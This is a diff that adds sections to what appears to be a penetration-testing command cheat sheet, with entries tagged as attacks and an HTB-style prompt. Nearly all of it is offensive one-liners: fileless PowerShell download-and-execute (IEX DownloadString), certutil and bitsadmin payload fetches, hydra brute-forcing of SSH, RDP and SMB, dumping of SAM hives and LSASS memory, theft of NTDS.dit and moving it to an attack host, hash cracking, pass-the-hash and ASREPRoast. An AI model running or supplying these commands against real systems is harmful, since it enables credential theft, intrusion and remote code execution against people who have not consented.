@@ -465,3 +465,319 @@ rdp-sec-check.pl <target>
 ```
 xfreerdp /u:<user> /p:"<password>" /v:<target>
 ```
+
+##  file transfers - windows - powershell download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Invoke-WebRequest <TargetFileURL> -OutFile <windowsOut>
+```
+
+##  file transfers - windows - execute in memory powershell (download)
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+IEX (New-Object Net.WebClient).DownloadString('<TargetFileURL>')
+```
+
+##  file transfers - windows - upload with powershell
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Invoke-WebRequest -Uri <TargetDirectoryURL> -Method POST -Body $b64
+```
+
+##  file transfers - windows - bitsadmin download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+bitsadmin /transfer n <TargetFileURL> C:\Temp\<windowsOut>
+```
+##  file transfers - windows - certutil download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+certutil.exe -verifyctl -split -f <TargetFileURL>
+```
+##  file transfers - linux - wget download
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+wget <TargetFileURL> -O /tmp/<linuxOut>
+```
+##  file transfers - linux - curl download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+curl -o /tmp/<linuxOut> <TargetFileURL>
+```
+##  file transfers - miscellaneous - php download
+#plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+php -r '$file = file_get_contents("<TargetFileURL>"); file_put_contents("<outFile>",$file);'
+```
+
+##  file transfers - miscellaneous - scp upload
+#plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+scp <pathToGetFile> <user>@<ip>:<pathToOutFileWname>
+```
+
+##  file transfers - miscellaneous - scp download
+#plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+scp <user>@<ip>:<pathToGetFile> <pathToOutFileWname>
+```
+
+## file transfers - windows - powershell using chrome User Agent download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Invoke-WebRequest <TargetFileURL> -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "<windowsOut>"
+```
+
+## file transfers - powershell b64 download
+#plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Linux:
+md5sum <file>
+cat <file> | base64 -w 0;echo
+
+Windows:
+PS C:\htb> [IO.File]::WriteAllBytes("C:\<pathWindowsOut>", [Convert]::FromBase64String("<base64String>"))`
+
+Get-FileHash C:\<pathWindowsOut> -Algorithm md5`
+```
+
+## file transfers - windows - powershell web download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<Output File Name>')
+```
+
+## file transfers - windows - powershell web download 2
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<Output File Name>')
+```
+
+## file transfers - windows - powershell web download 3
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+(New-Object Net.WebClient).DownloadFileAsync('<TargetFileURL>','<Output File Name>')
+```
+
+## file transfers - windows - powershell fileless download
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+IEX (New-Object Net.WebClient).DownloadString('<TargetFileURL>')
+```
+
+## file transfers - windows - powershell fileless download 2
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+(New-Object Net.WebClient).DownloadString('<TargetFileURL>') | IEX
+```
+
+## file transfers - linux - start  smbserver download/upload (old windows versions)
+#plateform/linux #target/remote #port/445 #protocol/ #cat/ATTACK/
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+## file transfers - linux - start smbserver download/upload (new windows versions)
+#plateform/linux #target/remote #port/445 #protocol/ #cat/ATTACK/
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user user -password server
+```
+
+## file transfers - windows - mount smb download/upload
+#plateform/windows #target/remote #port/445 #protocol/ #cat/ATTACK/
+```
+net use n: \\<ip>\<sharename> /user:server <sharename>
+```
+
+## file transfers - linux - start ftp server download/upload
+#plateform/linux #target/remote #port/21 #protocol/ #cat/ATTACK/
+```
+sudo python3 -m pyftpdlib --port 21
+```
+
+## file transfers - windows - transfering files via ftp
+#plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<file>', '<windowsOutPathWname>')
+```
+
+## file transfers - windows - powershell web 2
+#plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Invoke-WebRequest <TargetFileURL> -OutFile <windowsOut>
+```
+
+
+## password attacks - remote - network services - evil-winrm
+#plateform/linux #target/remote #port/5985 #protocol/winrm #cat/ATTACK/
+```
+evil-winrm -i <target-ip> -u <user/userlist> -p <password/passlist>
+```
+
+## password attacks - remote - network services - ssh bruteforce
+#plateform/linux #target/remote #port/22 #protocol/ssh #cat/ATTACK/
+```
+hydra -L <userlist> -P <passlist> ssh://<target-ip>
+```
+
+## password attacks - remote - network services - rdp bruteforce
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+hydra -L <userlist> -P <passlist> rdp://<target-ip>
+```
+
+## password attacks - remote - network services - rdp nxc
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc rdp <target-ip> -u <user/userlist> -p <password/passlist>
+```
+
+## password attacks - remote - network services - rdp connect
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+xfreerdp /v:<target-IP> /u:<user> /p:<password>
+```
+
+## password attacks - remote - network services - smb nxc
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <target-ip> -u <user/userlist> -p <password/passlist> --shares
+```
+
+## password attacks - remote - network services - smb bruteforce
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+hydra -L <userlist> -P <passlist> smb://10.129.42.197
+```
+
+## password attacks - remote - network services - smb smbclient
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbclient -U <user> \\\\<target-ip>\\<SHARENAME>
+```
+
+## password attacks - local - SAM registry hives hklm/sam
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+reg.exe save hklm\sam C:\sam.save
+```
+
+## password attacks - local - SAM registry hives hklm/system
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+reg.exe save hklm\system C:\system.save
+```
+
+## password attacks - local - SAM registry hives hklm/security
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+reg.exe save hklm\security C:\security.save
+```
+
+## password attacks - remote - smbserver
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <sharename> <directoryPathToShare>
+```
+
+## password attacks - local - secretsdump dump hives 
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+## password attacks - local - crack hashes NTLM from sam 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo hashcat -m 1000 <hashesFile> <pathToWordlist>
+```
+
+## password attacks - remote - lsa dump netexec
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+crackmapexec smb <targetIP> --local-auth -u <user> -p <password> --lsa
+```
+
+## password attacks - remote - sam dump netexec
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+crackmapexec smb <targetIP> --local-auth -u <user> -p <password> --sam
+```
+
+## password attacks - local - get lsass process id
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+Get-Process lsass
+```
+
+## password attacks - local - dump lsass to file with privileged permissions powershell
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsassPID> C:\lsass.dmp full
+```
+
+## password attacks - local - dump lsass pypycatz
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+pypykatz lsa minidump <pathLsass.dmp>
+```
+
+## password attacks - local - username mutations
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+./username-anarchy -i <pathUsernameBaseList>
+```
+
+## password attacks - local - Checking Local Group Membership
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+net localgroup
+```
+
+## password attacks - local - Checking Local User Account Privileges including Domain
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+net user bwilliamson
+```
+
+## password attacks - local - Creating Shadow Copy of C:
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+vssadmin CREATE SHADOW /For=C:
+```
+
+## password attacks - local - Copying NTDS.dit from the VSS
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+
+## password attacks - local - Transferring NTDS.dit to Attack Host
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+cmd.exe /c move C:\NTDS\NTDS.dit \\<IP>\<share>
+```
+
+## password attacks - remote - capture ntds with netexec
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <ip> -u <user> -p <password> --ntds
+```
+
+## password attacks - remote - pass the hash evil-winrm
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+evil-winrm -i <ip>  -u  <user> -H "<NThash>"
+```
+
+## password attacks - remote - pass the hash netexec
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <ip> -u <user> -d <domain> -H <Hash>
+```
+
+## password attacks - remote - ASREPRoast netexec
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc ldap <ip> -u <user> -p '<password>' --asreproast output.txt
+```
